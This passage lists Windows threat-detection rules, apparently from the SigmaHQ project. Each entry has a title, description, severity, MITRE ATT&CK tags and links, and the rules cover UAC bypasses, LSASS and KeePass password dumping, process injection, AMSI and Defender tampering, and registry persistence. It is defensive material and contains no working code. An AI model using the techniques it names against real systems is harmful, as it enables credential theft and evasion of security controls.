    * MITRE: attack.persistence
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1543.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_moriya_rootkit.yml
* https://securelist.com/operation-tunnelsnake-and-moriya-rootkit/101831

    
### InstallerFileTakeOver LPE CVE-2021-41379 File Create Event
    
    Detects signs of the exploitation of LPE CVE-2021-41379 that include an msiexec process that creates an elevation_service.exe file

    * Level: critical
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1068
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_cve_2021_41379_msi_lpe.yml
* https://github.com/klinix5/InstallerFileTakeOver

* https://www.zerodayinitiative.com/advisories/ZDI-21-1308/

    
### Suspicious Process Writes Ntds.dit
    
    Detects suspicious processes that write (copy) a Active Directory database (ntds.dit) file

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.002
    * MITRE: attack.t1003.003
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_susp_ntds_dit.yml
* https://stealthbits.com/blog/extracting-password-hashes-from-the-ntds-dit-file/

* https://adsecurity.org/?p=2398

    
### UAC Bypass Using IEInstal - File
    
    Detects the pattern of UAC Bypass using IEInstal.exe (UACMe 64)

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1548.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_uac_bypass_ieinstal.yml
* https://github.com/hfiref0x/UACME

    
### Creation of an Executable by an Executable
    
    Detects the creation of an executable by another executable

    * Level: low
    * MITRE: attack.resource_development
    * MITRE: attack.t1587.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_susp_dropper.yml
* Malware Sandbox

    
### QuarksPwDump Dump File
    
    Detects a dump file written by QuarksPwDump password dumper

    * Level: critical
    * MITRE: attack.credential_access
    * MITRE: attack.t1003.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_quarkspw_filedump.yml
* https://jpcertcc.github.io/ToolAnalysisResultSheet/details/QuarksPWDump.htm

    
### Suspicious Creation with Colorcpl
    
    Once executed, colorcpl.exe will copy the arbitrary file to c:\windows\system32\spool\drivers\color\

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1564
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_susp_colorcpl.yml
* https://twitter.com/eral4m/status/1480468728324231172?s=20

    
### Adwind RAT / JRAT
    
    Detects javaw.exe in AppData folder as used by Adwind / JRAT

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1059.005
    * MITRE: attack.t1059.007
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_event/file_event_win_mal_adwind.yml
* https://www.hybrid-analysis.com/sample/ba86fa0d4b6af2db0656a88b1dd29f36fe362473ae8ad04255c4e52f214a541c?environmentId=100

* https://www.first.org/resources/papers/conf2017/Advanced-Incident-Detection-and-Threat-Hunting-using-Sysmon-and-Splunk.pdf

    
### Executable in ADS
    
    Detects the creation of an ADS data stream that contains an executable (non-empty imphash)

    * Level: critical
    * MITRE: attack.defense_evasion
    * MITRE: attack.s0139
    * MITRE: attack.t1564.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/create_stream_hash/sysmon_ads_executable.yml
* https://twitter.com/0xrawsec/status/1002478725605273600?s=21

    
### Exports Registry Key To an Alternate Data Stream
    
    Exports the target Registry key and hides it in the specified alternate data stream.

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1564.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/create_stream_hash/sysmon_regedit_export_to_ads.yml
* https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Regedit.yml

* https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f

    
### Accessing WinAPI in PowerShell. Code Injection
    
    Detecting Code injection with PowerShell in another process

    * Level: high
    * MITRE: attack.execution
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/create_remote_thread/sysmon_powershell_code_injection.yml
* https://speakerdeck.com/heirhabarov/hunting-for-powershell-abuse

    
### Suspicious Remote Thread Created
    
    Offensive tradecraft is switching away from using APIs like "CreateRemoteThread", however, this is still largely observed in the wild. This rule aims to detect suspicious processes (those we would not expect to behave in this way like word.exe or outlook.exe) creating remote threads on other processes. It is a generalistic rule, but it should have a low FP ratio due to the selected range of processes.

    * Level: high
    * MITRE: attack.privilege_escalation
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1055
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/create_remote_thread/sysmon_susp_remote_thread.yml
* Personal research, statistical analysis

* https://lolbas-project.github.io

    
### Remote Thread Creation Ttdinject.exe Proxy
    
    Detects a remote thread creation of Ttdinject.exe used as proxy

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1127
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/create_remote_thread/create_remote_thread_win_ttdinjec.yml
* https://lolbas-project.github.io/lolbas/Binaries/Ttdinject/

    
### CobaltStrike Process Injection
    
    Detects a possible remote threat creation with certain characteristics which are typical for Cobalt Strike beacons

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1055.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/create_remote_thread/sysmon_cobaltstrike_process_injection.yml
* https://medium.com/@olafhartong/cobalt-strike-remote-threads-detection-206372d11d0f

* https://blog.cobaltstrike.com/2018/04/09/cobalt-strike-3-11-the-snake-that-eats-its-tail/

    
### Remote Thread Creation in Suspicious Targets
    
    Detects a remote thread creation in suspicious taregt images

    * Level: high
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/create_remote_thread/create_remote_thread_win_susp_targets.yml
* https://blog.redbluepurple.io/offensive-research/bypassing-injection-detection

    
### KeePass Password Dumping
    
    Detects remote thread creation in KeePass.exe indicating password dumping activity

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.t1555.005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/create_remote_thread/sysmon_password_dumper_keepass.yml
* https://www.cisa.gov/uscert/ncas/alerts/aa20-259a

* https://github.com/denandz/KeeFarce

* https://github.com/GhostPack/KeeThief

    
### PowerShell Rundll32 Remote Thread Creation
    
    Detects PowerShell remote thread creation in Rundll32.exe

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.execution
    * MITRE: attack.t1218.011
    * MITRE: attack.t1059.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/create_remote_thread/sysmon_susp_powershell_rundll32.yml
* https://www.fireeye.com/blog/threat-research/2018/06/bring-your-own-land-novel-red-teaming-technique.html

    
### Password Dumper Remote Thread in LSASS
    
    Detects password dumper activity by monitoring remote thread creation EventID 8 in combination with the lsass.exe process as TargetImage. The process in field Process is the malicious program. A single execution can lead to hundreds of events.

    * Level: high
    * MITRE: attack.credential_access
    * MITRE: attack.s0005
    * MITRE: attack.t1003.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/create_remote_thread/sysmon_password_dumper_lsass.yml
* https://jpcertcc.github.io/ToolAnalysisResultSheet/details/WCE.htm

    
### CreateRemoteThread API and LoadLibrary
    
    Detects potential use of CreateRemoteThread api and LoadLibrary function to inject DLL into a process

    * Level: critical
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1055.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/create_remote_thread/sysmon_createremotethread_loadlibrary.yml
* https://threathunterplaybook.com/notebooks/windows/05_defense_evasion/WIN-180719170510.html

    
### CACTUSTORCH Remote Thread Creation
    
    Detects remote thread creation from CACTUSTORCH as described in references.

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1055.012
    * MITRE: attack.execution
    * MITRE: attack.t1059.005
    * MITRE: attack.t1059.007
    * MITRE: attack.t1218.005
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/create_remote_thread/sysmon_cactustorch.yml
* https://twitter.com/SBousseaden/status/1090588499517079552

* https://github.com/mdsecactivebreach/CACTUSTORCH

    
### Rename Common File to DLL File
    
    Detects cases in which a file gets renamed to .dll, which often happens to bypass perimeter protection

    * Level: medium
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/file_rename/file_rename_win_not_dll_to_dll.yml
* https://twitter.com/ffforward/status/1481672378639912960

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1036/T1036.md#atomic-test-1---system-file-copied-to-unusual-location

    
### Windows Registry Persistence COM Key Linking
    
    Detects COM object hijacking via TreatAs subkey

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1546.015
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_add/registry_add_persistence_key_linking.yml
* https://bohops.com/2018/08/18/abusing-the-com-registry-structure-part-2-loading-techniques-for-evasion-and-persistence/

    
### Usage of Sysinternals Tools
    
    Detects the usage of Sysinternals Tools due to accepteula key being added to Registry

    * Level: low
    * MITRE: attack.resource_development
    * MITRE: attack.t1588.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_add/registry_add_sysinternals_eula_accepted.yml
* https://twitter.com/Moti_B/status/1008587936735035392

    
### Sysinternals SDelete Registry Keys
    
    A General detection to trigger for the creation or modification of .*\Software\Sysinternals\SDelete registry keys. Indicators of the use of Sysinternals SDelete tool.

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1070.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_add/registry_add_sysinternals_sdelete_registry_keys.yml
* https://github.com/OTRF/detection-hackathon-apt29/issues/9

* https://threathunterplaybook.com/evals/apt29/detections/4.B.2_59A9AC92-124D-4C4B-A6BF-3121C98677C3.html

    
### Logon Scripts Creation in UserInitMprLogonScript Registry
    
    Detects creation of UserInitMprLogonScript persistence method

    * Level: high
    * MITRE: attack.t1037.001
    * MITRE: attack.persistence
    * MITRE: attack.lateral_movement
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_add/registry_add_logon_scripts_userinitmprlogonscript_reg.yml
* https://attack.mitre.org/techniques/T1037/

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1037.001/T1037.001.md

    
### Ursnif
    
    Detects new registry key created by Ursnif malware.

    * Level: critical
    * MITRE: attack.execution
    * MITRE: attack.t1112
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_add/registry_add_mal_ursnif.yml
* https://blog.yoroi.company/research/ursnif-long-live-the-steganography/

* https://blog.trendmicro.com/trendlabs-security-intelligence/phishing-campaign-uses-hijacked-emails-to-deliver-ursnif-by-replying-to-ongoing-threads/

    
### NetWire RAT Registry Key
    
    Attempts to detect registry events for common NetWire key HKCU\Software\NetWire

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1112
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_add/registry_add_mal_netwire.yml
* https://www.fortinet.com/blog/threat-research/new-netwire-rat-variant-spread-by-phishing

* https://resources.infosecinstitute.com/topic/netwire-malware-what-it-is-how-it-works-and-how-to-prevent-it-malware-spotlight/

* https://unit42.paloaltonetworks.com/guloader-installing-netwire-rat/

* https://blogs.blackberry.com/en/2021/09/threat-thursday-netwire-rat-is-coming-down-the-line

* https://app.any.run/tasks/41ecdbde-4997-4301-a350-0270448b4c8f/

    
### Removal of Potential COM Hijacking Registry Keys
    
    A General detection to trigger for processes removing .*\shell\open\command registry keys. Registry keys that might have been used for COM hijacking activities.

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1112
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_delete/registry_delete_removal_com_hijacking_registry_key.yml
* https://github.com/OTRF/detection-hackathon-apt29/issues/7

* https://threathunterplaybook.com/evals/apt29/detections/3.C.1_22A46621-7A92-48C1-81BF-B3937EB4FDC3.html

* https://docs.microsoft.com/en-us/windows/win32/shell/launch

* https://docs.microsoft.com/en-us/windows/win32/api/shobjidl_core/nn-shobjidl_core-iexecutecommand

* https://docs.microsoft.com/en-us/windows/win32/shell/shell-and-managed-code

    
### Removal Amsi Provider Reg Key
    
    Remove the AMSI Provider registry key in HKLM\Software\Microsoft\AMSI to disable AMSI inspection

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_delete/registry_delete_removal_amsi_registry_key.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md

* https://seclists.org/fulldisclosure/2020/Mar/45

    
### Terminal Server Client Connection History Cleared
    
    Detects the deletion of registry keys containing the MSTSC connection history

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1070
    * MITRE: attack.t1112
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_delete/registry_delete_mstsc_history_cleared.yml
* https://docs.microsoft.com/en-us/troubleshoot/windows-server/remote/remove-entries-from-remote-desktop-connection-computer

* http://woshub.com/how-to-clear-rdp-connections-history/

    
### Removal SD Value to Hide Schedule Task
    
    Remove SD (Security Descriptor) value in \Schedule\TaskCache\Tree registry hive to hide schedule task. This technique is used by Tarrask malware

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_delete/registry_delete_removal_sd_value_scheduled_task_hide.yml
* https://www.microsoft.com/security/blog/2022/04/12/tarrask-malware-uses-scheduled-tasks-for-defense-evasion/

    
### Suspicious Service Installed
    
    Detects installation of NalDrv or PROCEXP152 services via registry-keys to non-system32 folders. Both services are used in the tool Ghost-In-The-Logs (https://github.com/bats3c/Ghost-In-The-Logs), which uses KDU (https://github.com/hfiref0x/KDU)

    * Level: medium
    * MITRE: attack.t1562.001
    * MITRE: attack.defense_evasion
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_susp_service_installed.yml
* https://blog.dylan.codes/evading-sysmon-and-windows-event-logging/

    
### Disable PUA Protection on Windows Defender
    
    Detects disabling Windows Defender PUA protection

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_disabled_pua_protection_on_microsoft_defender.yml
* https://www.tenforums.com/tutorials/32236-enable-disable-microsoft-defender-pua-protection-windows-10-a.html

    
### Blackbyte Ransomware Registry
    
    BlackByte set three different registry values to escalate privileges and begin setting the stage for lateral movement and encryption

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1112
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_blackbyte_ransomware.yml
* https://redcanary.com/blog/blackbyte-ransomware/?utm_source=twitter&utm_medium=social

* https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/blackbyte-ransomware-pt-1-in-depth-analysis/

    
### Running Chrome VPN Extensions via the Registry 2 VPN Extension
    
    Running Chrome VPN Extensions via the Registry install 2 vpn extension

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.t1133
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_chrome_extension.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1133/T1133.md#atomic-test-1---running-chrome-vpn-extensions-via-the-registry-2-vpn-extension

    
### Office Autorun Keys Modification
    
    Detects modification of autostart extensibility point (ASEP) in registry.

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1547.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_asep_reg_keys_modification_office.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.001/T1547.001.md

* https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns

* https://gist.github.com/GlebSukhodolskiy/0fc5fa5f482903064b448890db1eaf9d

    
### PowerShell Logging Disabled
    
    Detects the modification of the registry of the currently logged in user to disable PowerShell module logging, script block logging or transcription and script execution logging

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1564.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_powershell_logging_disabled.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1112/T1112.md#atomic-test-32---windows-powershell-logging-disabled

    
### Disable Tamper Protection on Windows Defender
    
    Detects disabling Windows Defender Tamper Protection

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_disabled_tamper_protection_on_microsoft_defender.yml
* https://www.tenforums.com/tutorials/123792-turn-off-tamper-protection-microsoft-defender-test.html

    
### Enable Microsoft Dynamic Data Exchange
    
    Enable Dynamic Data Exchange protocol (DDE) in all supported editions of Microsoft Word or Excel.

    * Level: medium
    * MITRE: attack.execution
    * MITRE: attack.t1559.002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_office_enable_dde.yml
* https://msrc.microsoft.com/update-guide/vulnerability/ADV170021

    
### Suspicious Printer Driver Empty Manufacturer
    
    Detects a suspicious printer driver installation with an empty Manufacturer value

    * Level: high
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1574
    * MITRE: cve.2021.1675
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_susp_printer_driver.yml
* https://twitter.com/SBousseaden/status/1410545674773467140

    
### Stealthy VSTO Persistence
    
    Detects persistence via Visual Studio Tools for Office (VSTO) add-ins in Office applications.

    * Level: medium
    * MITRE: attack.t1137.006
    * MITRE: attack.persistence
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_office_vsto_persistence.yml
* https://twitter.com/_vivami/status/1347925307643355138

* https://vanmieghem.io/stealth-outlook-persistence/

    
### Service Binary in Uncommon Folder
    
    Detect the creation of a service with a service binary located in a uncommon directory

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1112
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_creation_service_uncommon_folder.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md

    
### Changing RDP Port to Non Standard Number
    
    Remote desktop is a common feature in operating systems.
It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system.
Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).


    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.t1547.010
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_change_rdp_port.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1021.001/T1021.001.md#atomic-test-1---rdp-to-domaincontroller

    
### GlobalFlags Registry Persistence Mechanisms
    
    Detects persistence registry keys

    * Level: critical
    * MITRE: attack.privilege_escalation
    * MITRE: attack.persistence
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1546.012
    * MITRE: car.2013-01-002
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_globalflags_persistence.yml
* https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/

    
### Session Manager Autorun Keys Modification
    
    Detects modification of autostart extensibility point (ASEP) in registry.

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1547.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_asep_reg_keys_modification_session_manager.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.001/T1547.001.md

* https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns

* https://gist.github.com/GlebSukhodolskiy/0fc5fa5f482903064b448890db1eaf9d

    
### Registry Persitence via Service in Safe Mode
    
    Detects the modification of the registry to allow a driver or service to persist in Safe Mode.

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1564.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_add_load_service_in_safe_mode.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1112/T1112.md#atomic-test-33---windows-add-registry-value-to-load-service-in-safe-mode-without-network

* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1112/T1112.md#atomic-test-34---windows-add-registry-value-to-load-service-in-safe-mode-with-network

    
### Registry Disable System Restore
    
    Detects the modification of the registry to disable a system restore on the computer

    * Level: high
    * MITRE: attack.impact
    * MITRE: attack.t1490
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_disable_system_restore.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1490/T1490.md#atomic-test-9---disable-system-restore-through-registry

    
### Disable Microsoft Office Security Features
    
    Disable Microsoft Office Security Features by registry

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_disable_microsoft_office_security_features.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md

* https://unit42.paloaltonetworks.com/unit42-gorgon-group-slithering-nation-state-cybercrime/

* https://yoroi.company/research/cyber-criminal-espionage-operation-insists-on-italian-manufacturing/

    
### Registry Hide Function from User
    
    Detects registry modifications that hide internal tools or functions from the user (malware like Agent Tesla, Hermetic Wiper uses this technique)

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1112
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_hide_fonction_user.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1112/T1112.md

    
### Service Binary in Temp Folder
    
    Detect the creation of a service with a service binary located in a temporary directory

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1112
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_creation_service_temp_folder.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.001/T1562.001.md

    
### Internet Explorer Autorun Keys Modification
    
    Detects modification of autostart extensibility point (ASEP) in registry.

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1547.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_asep_reg_keys_modification_internet_explorer.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.001/T1547.001.md

* https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns

* https://gist.github.com/GlebSukhodolskiy/0fc5fa5f482903064b448890db1eaf9d

    
### Disable Microsoft Defender Firewall via Registry
    
    Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage

    * Level: medium
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1562.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_disable_defender_firewall.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.004/T1562.004.md#atomic-test-2---disable-microsoft-defender-firewall-via-registry

    
### COMPlus_ETWEnabled Registry Modification
    
    Potential adversaries stopping ETW providers recording loaded .NET assemblies.

    * Level: critical
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1112
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_etw_disabled.yml
* https://twitter.com/_xpn_/status/1268712093928378368

* https://social.msdn.microsoft.com/Forums/vstudio/en-US/0878832e-39d7-4eaf-8e16-a729c4c40975/what-can-i-use-e13c0d23ccbc4e12931bd9cc2eee27e4-for?forum=clr

* https://github.com/dotnet/runtime/blob/ee2355c801d892f2894b0f7b14a20e6cc50e0e54/docs/design/coreclr/jit/viewing-jit-dumps.md#setting-configuration-variables

* https://github.com/dotnet/runtime/blob/f62e93416a1799aecc6b0947adad55a0d9870732/src/coreclr/src/inc/clrconfigvalues.h#L35-L38

* https://github.com/dotnet/runtime/blob/7abe42dc1123722ed385218268bb9fe04556e3d3/src/coreclr/src/inc/clrconfig.h#L33-L39

* https://github.com/dotnet/runtime/search?p=1&q=COMPlus_&unscoped_q=COMPlus_

* https://bunnyinside.com/?term=f71e8cb9c76a

* http://managed670.rssing.com/chan-5590147/all_p1.html

* https://github.com/dotnet/runtime/blob/4f9ae42d861fcb4be2fcd5d3d55d5f227d30e723/docs/coding-guidelines/clr-jit-coding-conventions.md#1412-disabling-code

    
### Wow6432Node CurrentVersion Autorun Keys Modification
    
    Detects modification of autostart extensibility point (ASEP) in registry.

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1547.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_asep_reg_keys_modification_wow6432node_currentversion.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.001/T1547.001.md

* https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns

* https://gist.github.com/GlebSukhodolskiy/0fc5fa5f482903064b448890db1eaf9d

    
### UAC Bypass via Sdclt
    
    Detects the pattern of UAC Bypass using registry key manipulation of sdclt.exe (e.g. UACMe 53)

    * Level: high
    * MITRE: attack.defense_evasion
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1548.002
    * MITRE: car.2019-04-001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_uac_bypass_sdclt.yml
* https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/

* https://github.com/hfiref0x/UACME

    
### Suspicious New Printer Ports in Registry (CVE-2020-1048)
    
    Detects a new and suspicious printer port creation in Registry that could be an attempt to exploit CVE-2020-1048

    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.execution
    * MITRE: attack.defense_evasion
    * MITRE: attack.t1112
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_cve_2020_1048_new_printer_port.yml
* https://windows-internals.com/printdemon-cve-2020-1048/

    
### Registry Modification to Hidden File Extension
    
    Hides the file extension through modification of the registry

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1137
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_hidden_extention.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1112/T1112.md#atomic-test-1---modify-registry-of-current-user-profile---cmd

* https://unit42.paloaltonetworks.com/ransomware-families/

* https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?name=TrojanSpy%3aMSIL%2fHakey.A

    
### UAC Bypass via Event Viewer
    
    Detects UAC bypass method using Windows event viewer

    * Level: critical
    * MITRE: attack.defense_evasion
    * MITRE: attack.privilege_escalation
    * MITRE: attack.t1548.002
    * MITRE: car.2019-04-001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_uac_bypass_eventvwr.yml
* https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/

* https://www.hybrid-analysis.com/sample/e122bc8bf291f15cab182a5d2d27b8db1e7019e4e96bb5cdbd1dfe7446f3f51f?environmentId=100

    
### Winlogon Notify Key Logon Persistence
    
    Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in.
Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete.


    * Level: high
    * MITRE: attack.persistence
    * MITRE: attack.t1547.004
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_winlogon_notify_key.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.004/T1547.004.md#atomic-test-3---winlogon-notify-key-logon-persistence---powershell

    
### WinSock2 Autorun Keys Modification
    
    Detects modification of autostart extensibility point (ASEP) in registry.

    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1547.001
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_asep_reg_keys_modification_winsock2.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.001/T1547.001.md

* https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns

* https://gist.github.com/GlebSukhodolskiy/0fc5fa5f482903064b448890db1eaf9d

    
### Registry Key Creation or Modification for Shim DataBase
    
    Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims.
The Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time


    * Level: medium
    * MITRE: attack.persistence
    * MITRE: attack.t1546.011
    
References: 
* https://github.com/SigmaHQ/sigma/tree/master/rules/windows/registry/registry_set/registry_set_shim_databases_persistence.yml
* https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.011/T1546.011.md#atomic-test-3---registry-key-creation-andor-modification-events-for-sdb

* https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html

    
